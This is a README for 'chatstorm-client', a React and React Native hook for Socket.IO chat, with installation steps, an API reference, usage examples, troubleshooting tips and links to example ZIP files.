# ChatStorm Client

A powerful React hook for real-time chat functionality using Socket.IO. ChatStorm Client provides an easy-to-use interface for integrating socket-based messaging into your **React** and **React Native** applications with comprehensive event handling and callback systems.

## 🚀 Features

- **Real-time Communication**: Instant message delivery and updates
- **Socket.IO Integration**: Robust WebSocket connection management
- **Event-driven Architecture**: Comprehensive callback system for all events
- **Typing Indicators**: Real-time typing status notifications
- **Message History**: Retrieve and search past conversations
- **Chat Management**: Join chats, get chat lists, and manage conversations
- **Message Operations**: Send, delete, and update messages
- **TypeScript Support**: Full TypeScript definitions included
- **Auto-reconnection**: Automatic connection handling and cleanup

## 📦 Installation

Install the package via npm:

```bash
npm install chatstorm-client
```

### Peer Dependencies

Make sure you have the following dependencies installed:

**For React:**
```bash
npm install react react-dom socket.io-client
```

**For React Native:**
```bash
npm install react socket.io-client
# react-dom is not needed for React Native
```

## 🏃‍♂️ Quick Start

### React Native Setup

For React Native projects, you may need to install additional polyfills for Socket.IO:

```bash
npm install react-native-get-random-values
```

Then import it at the top of your entry file (usually `index.js` or `App.js`):

```js
import 'react-native-get-random-values';
```

### Basic Setup

```tsx
import React from 'react';
import useChatSocket from 'chatstorm-client';

const ChatComponent = () => {
  const BACKEND_SOCKET_URL = 'ws://localhost:3001';
  const MONGO_USER_ID = 'your-user-id-here';

  const {
    messages,
    sendMessage,
    joinChat,
    getChatList,
    retrieveMessages,
    updateTypingAlert,
    deleteMessage,
    setHandshakeSuccessCallback,
    setMessageReceivedCallback,
    setChatListCallback,
    setRetrieveMessagesCallback,
    setMessageSentCallback,
    setMessageUpdateCallback,
    setReceiverMessageUpdateCallback,
    setOnLeaveCallback,
  } = useChatSocket(BACKEND_SOCKET_URL, MONGO_USER_ID);

  // Set up event callbacks
  React.useEffect(() => {
    setHandshakeSuccessCallback((data) => {
      console.log('Connected successfully:', data);
    });

    setMessageReceivedCallback((message) => {
      console.log('New message received:', message);
    });

    setChatListCallback((chatList) => {
      console.log('Chat list updated:', chatList);
    });

    setRetrieveMessagesCallback((messages) => {
      console.log('Messages retrieved:', messages);
    });
  }, []);

  return (
    <div>
      <h1>Chat Application</h1>
      {/* Your chat UI components here */}
    </div>
  );
};
```

## 📚 API Reference

### Hook Parameters

```tsx
useChatSocket(serverUrl: string, userId: string)
```

- `serverUrl`: WebSocket server URL (e.g., 'ws://localhost:3001')
- `userId`: Unique identifier for the current user

### Returned Functions

#### Core Functions

| Function | Parameters | Description |
|----------|------------|-------------|
| `sendMessage` | `{ receiverId: string, message: string }` | Send a message to a specific user |
| `joinChat` | `{ receiverId: string }` | Join a chat with another user |
| `getChatList` | `{ keyword: string }` | Retrieve list of available chats |
| `retrieveMessages` | `{ receiverId: string, keyword: string }` | Get message history with a user |
| `updateTypingAlert` | `{ receiverId: string, isTyping: boolean }` | Send typing status |
| `deleteMessage` | `{ messageId: string }` | Delete a specific message |

#### Callback Setters

| Function | Description |
|----------|-------------|
| `setHandshakeSuccessCallback` | Called when connection is established |
| `setMessageReceivedCallback` | Called when a new message is received |
| `setMessageSentCallback` | Called when a message is sent successfully |
| `setChatListCallback` | Called when chat list is updated |
| `setRetrieveMessagesCallback` | Called when messages are retrieved |
| `setMessageUpdateCallback` | Called when a message is updated |
| `setReceiverMessageUpdateCallback` | Called when receiver updates a message |
| `setTypingAlertCallback` | Called when typing status is received |
| `setOnLeaveCallback` | Called when a user leaves the chat |

### State

- `messages`: Array of current messages in the chat

## 💡 Use Cases

### 1. Private Messaging App

```tsx
import React, { useState } from 'react';
import useChatSocket from 'chatstorm-client';

const PrivateChat = () => {
  const [currentChat, setCurrentChat] = useState(null);
  const [messageInput, setMessageInput] = useState('');
  const [chatList, setChatList] = useState([]);

  const {
    messages,
    sendMessage,
    joinChat,
    getChatList,
    retrieveMessages,
    setMessageReceivedCallback,
    setChatListCallback,
    setRetrieveMessagesCallback,
  } = useChatSocket('ws://localhost:3001', 'user123');

  React.useEffect(() => {
    // Load chat list on component mount
    getChatList({ keyword: '' });

    setChatListCallback((data) => {
      setChatList(data.chats || []);
    });

    setMessageReceivedCallback((message) => {
      console.log('New message:', message);
    });

    setRetrieveMessagesCallback((data) => {
      console.log('Messages loaded:', data);
    });
  }, []);

  const handleSendMessage = () => {
    if (messageInput.trim() && currentChat) {
      sendMessage({
        receiverId: currentChat.id,
        message: messageInput,
      });
      setMessageInput('');
    }
  };

  const handleSelectChat = (chat) => {
    setCurrentChat(chat);
    joinChat({ receiverId: chat.id });
    retrieveMessages({ receiverId: chat.id, keyword: '' });
  };

  return (
    <div style={{ display: 'flex', height: '100vh' }}>
      {/* Chat List Sidebar */}
      <div style={{ width: '300px', borderRight: '1px solid #ccc' }}>
        <h3>Chats</h3>
        {chatList.map((chat) => (
          <div
            key={chat.id}
            onClick={() => handleSelectChat(chat)}
            style={{
              padding: '10px',
              cursor: 'pointer',
              backgroundColor: currentChat?.id === chat.id ? '#f0f0f0' : 'white',
            }}
          >
            {chat.name}
          </div>
        ))}
      </div>

      {/* Chat Area */}
      <div style={{ flex: 1, display: 'flex', flexDirection: 'column' }}>
        {currentChat ? (
          <>
            <div style={{ padding: '10px', borderBottom: '1px solid #ccc' }}>
              <h3>{currentChat.name}</h3>
            </div>
            
            {/* Messages */}
            <div style={{ flex: 1, padding: '10px', overflowY: 'auto' }}>
              {messages.map((message, index) => (
                <div key={index} style={{ marginBottom: '10px' }}>
                  <strong>{message.sender}:</strong> {message.content}
                </div>
              ))}
            </div>

            {/* Message Input */}
            <div style={{ padding: '10px', borderTop: '1px solid #ccc' }}>
              <input
                type="text"
                value={messageInput}
                onChange={(e) => setMessageInput(e.target.value)}
                onKeyPress={(e) => e.key === 'Enter' && handleSendMessage()}
                placeholder="Type a message..."
                style={{ width: '100%', padding: '8px' }}
              />
              <button onClick={handleSendMessage}>Send</button>
            </div>
          </>
        ) : (
          <div style={{ padding: '20px', textAlign: 'center' }}>
            Select a chat to start messaging
          </div>
        )}
      </div>
    </div>
  );
};
```

### 2. Customer Support Chat

```tsx
import React, { useState, useEffect } from 'react';
import useChatSocket from 'chatstorm-client';

const CustomerSupport = () => {
  const [isTyping, setIsTyping] = useState(false);
  const [supportAgent, setSupportAgent] = useState(null);

  const {
    messages,
    sendMessage,
    joinChat,
    updateTypingAlert,
    setMessageReceivedCallback,
    setHandshakeSuccessCallback,
    setTypingAlertCallback,
  } = useChatSocket('ws://support.example.com', 'customer123');

  useEffect(() => {
    // Connect to support agent
    joinChat({ receiverId: 'support-agent-001' });

    setHandshakeSuccessCallback((data) => {
      console.log('Connected to support:', data);
      setSupportAgent(data.agent);
    });

    setMessageReceivedCallback((message) => {
      console.log('Support message:', message);
    });

    setTypingAlertCallback((data) => {
      setIsTyping(data.isTyping);
    });
  }, []);

  const handleTyping = (isTyping) => {
    updateTypingAlert({
      receiverId: 'support-agent-001',
      isTyping,
    });
  };

  return (
    <div>
      <h2>Customer Support</h2>
      {supportAgent && (
        <p>Connected to: {supportAgent.name}</p>
      )}
      
      <div>
        {messages.map((message, index) => (
          <div key={index}>
            <strong>{message.sender}:</strong> {message.content}
          </div>
        ))}
      </div>

      {isTyping && (
        <p>Support agent is typing...</p>
      )}

      <input
        type="text"
        onFocus={() => handleTyping(true)}
        onBlur={() => handleTyping(false)}
        onKeyPress={(e) => {
          if (e.key === 'Enter') {
            sendMessage({
              receiverId: 'support-agent-001',
              message: e.target.value,
            });
            e.target.value = '';
          }
        }}
        placeholder="Type your message..."
      />
    </div>
  );
};
```

### 3. Group Chat Application

```tsx
import React, { useState } from 'react';
import useChatSocket from 'chatstorm-client';

const GroupChat = () => {
  const [groupMembers, setGroupMembers] = useState([]);
  const [messageInput, setMessageInput] = useState('');

  const {
    messages,
    sendMessage,
    joinChat,
    getChatList,
    setMessageReceivedCallback,
    setChatListCallback,
  } = useChatSocket('ws://localhost:3001', 'user123');

  React.useEffect(() => {
    // Get group chats
    getChatList({ keyword: 'group' });

    setChatListCallback((data) => {
      setGroupMembers(data.chats || []);
    });

    setMessageReceivedCallback((message) => {
      console.log('Group message:', message);
    });
  }, []);

  const handleSendGroupMessage = () => {
    if (messageInput.trim()) {
      // Send to all group members
      groupMembers.forEach(member => {
        sendMessage({
          receiverId: member.id,
          message: messageInput,
        });
      });
      setMessageInput('');
    }
  };

  return (
    <div>
      <h2>Group Chat</h2>
      <div>
        <h3>Members ({groupMembers.length})</h3>
        {groupMembers.map(member => (
          <span key={member.id}>{member.name}, </span>
        ))}
      </div>
      
      <div>
        {messages.map((message, index) => (
          <div key={index}>
            <strong>{message.sender}:</strong> {message.content}
          </div>
        ))}
      </div>

      <input
        type="text"
        value={messageInput}
        onChange={(e) => setMessageInput(e.target.value)}
        onKeyPress={(e) => e.key === 'Enter' && handleSendGroupMessage()}
        placeholder="Type a group message..."
      />
      <button onClick={handleSendGroupMessage}>Send</button>
    </div>
  );
};
```

## 📱 React Native Example

Here's a complete example for React Native:

```tsx
import React, { useState, useEffect } from 'react';
import { View, Text, TextInput, TouchableOpacity, FlatList, StyleSheet } from 'react-native';
import useChatSocket from 'chatstorm-client';

const ChatScreen = () => {
  const [messageInput, setMessageInput] = useState('');
  const [chatMessages, setChatMessages] = useState([]);
  const BACKEND_SOCKET_URL = 'ws://your-server.com';
  const USER_ID = 'your-user-id';

  const {
    messages,
    sendMessage,
    joinChat,
    setMessageReceivedCallback,
    setHandshakeSuccessCallback,
  } = useChatSocket(BACKEND_SOCKET_URL, USER_ID);

  useEffect(() => {
    setHandshakeSuccessCallback((data) => {
      console.log('Connected:', data);
      // Join a chat after connection
      joinChat({ receiverId: 'target-user-id' });
    });

    setMessageReceivedCallback((message) => {
      setChatMessages((prev) => [...prev, message]);
    });
  }, []);

  const handleSend = () => {
    if (messageInput.trim()) {
      sendMessage({
        receiverId: 'target-user-id',
        message: messageInput,
      });
      setMessageInput('');
    }
  };

  return (
    <View style={styles.container}>
      <FlatList
        data={chatMessages}
        keyExtractor={(item, index) => index.toString()}
        renderItem={({ item }) => (
          <View style={styles.messageContainer}>
            <Text style={styles.messageText}>{item.message}</Text>
          </View>
        )}
      />
      <View style={styles.inputContainer}>
        <TextInput
          style={styles.input}
          value={messageInput}
          onChangeText={setMessageInput}
          placeholder="Type a message..."
        />
        <TouchableOpacity onPress={handleSend} style={styles.button}>
          <Text style={styles.buttonText}>Send</Text>
        </TouchableOpacity>
      </View>
    </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    padding: 10,
  },
  messageContainer: {
    padding: 10,
    marginVertical: 5,
    backgroundColor: '#f0f0f0',
    borderRadius: 5,
  },
  messageText: {
    fontSize: 16,
  },
  inputContainer: {
    flexDirection: 'row',
    padding: 10,
  },
  input: {
    flex: 1,
    borderWidth: 1,
    borderColor: '#ccc',
    borderRadius: 5,
    padding: 10,
    marginRight: 10,
  },
  button: {
    backgroundColor: '#007bff',
    padding: 10,
    borderRadius: 5,
    justifyContent: 'center',
  },
  buttonText: {
    color: 'white',
    fontWeight: 'bold',
  },
});

export default ChatScreen;
```

## 🔧 Advanced Configuration

### Custom Event Handling

```tsx
const AdvancedChat = () => {
  const {
    setMessageUpdateCallback,
    setReceiverMessageUpdateCallback,
    setOnLeaveCallback,
    deleteMessage,
  } = useChatSocket('ws://localhost:3001', 'user123');

  React.useEffect(() => {
    // Handle message updates
    setMessageUpdateCallback((data) => {
      console.log('Message updated:', data);
      // Update UI to show edited message
    });

    setReceiverMessageUpdateCallback((data) => {
      console.log('Receiver updated message:', data);
      // Handle when other user edits their message
    });

    setOnLeaveCallback((data) => {
      console.log('User left:', data);
      // Handle user leaving the chat
    });
  }, []);

  const handleDeleteMessage = (messageId) => {
    deleteMessage({ messageId });
  };

  return (
    <div>
      {/* Your chat UI with delete functionality */}
    </div>
  );
};
```

## 🐛 Troubleshooting

### Common Issues

1. **Connection Failed**
   ```tsx
   // Ensure your server URL is correct and accessible
   const serverUrl = 'ws://localhost:3001'; // or 'wss://' for secure connections
   ```

### React Native Specific Issues

1. **Socket.IO Connection Issues in React Native**
   - Make sure you've installed `react-native-get-random-values` and imported it at the top of your entry file
   - For Android, ensure you have internet permissions in `AndroidManifest.xml`:
     ```xml
     <uses-permission android:name="android.permission.INTERNET" />
     ```
   - For iOS, ensure your server URL uses `http://` or `https://` instead of `ws://` or `wss://` in some cases
   - The package automatically configures transports for React Native compatibility

2. **Metro Bundler Issues**
   - If you encounter module resolution errors, try clearing the Metro cache:
     ```bash
     npx react-native start --reset-cache
     ```

3. **Network Requests Blocked**
   - For Android 9+, you may need to configure network security:
     - Add `android:usesCleartextTraffic="true"` to `AndroidManifest.xml` for HTTP connections
     - Or use HTTPS/WSS for production

2. **Messages Not Received**
   ```tsx
   // Make sure to set up callbacks before sending messages
   useEffect(() => {
     setMessageReceivedCallback((message) => {
       console.log('Message received:', message);
     });
   }, []);
   ```

3. **Typing Indicators Not Working**
   ```tsx
   // Ensure you're calling updateTypingAlert with correct parameters
   updateTypingAlert({
     receiverId: 'target-user-id',
     isTyping: true, // or false
   });
   ```

### Debug Mode

Enable debug logging by checking the browser console for socket events:

```tsx
useEffect(() => {
  setHandshakeSuccessCallback((data) => {
    console.log('🔗 Connection established:', data);
  });
  
  setMessageReceivedCallback((message) => {
    console.log('📨 Message received:', message);
  });
  
  setChatListCallback((chatList) => {
    console.log('💬 Chat list updated:', chatList);
  });
}, []);
```

## 📄 License

ISC License - see package.json for details.

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## 📞 Support

For support and questions, please open an issue on the GitHub repository.

---

## 🔽 Download Examples (ZIP)

- **React Web Example ZIP**  
  👉 https://github.com/Vikas-Rajput-JS/Chatstorm-client/raw/refs/heads/master/test/react-web.zip

- **React Native Example ZIP**  
  👉 https://github.com/Vikas-Rajput-JS/Chatstorm-client/raw/refs/heads/master/test/native.zip


**Made with ❤️ by Vikas Rajput**
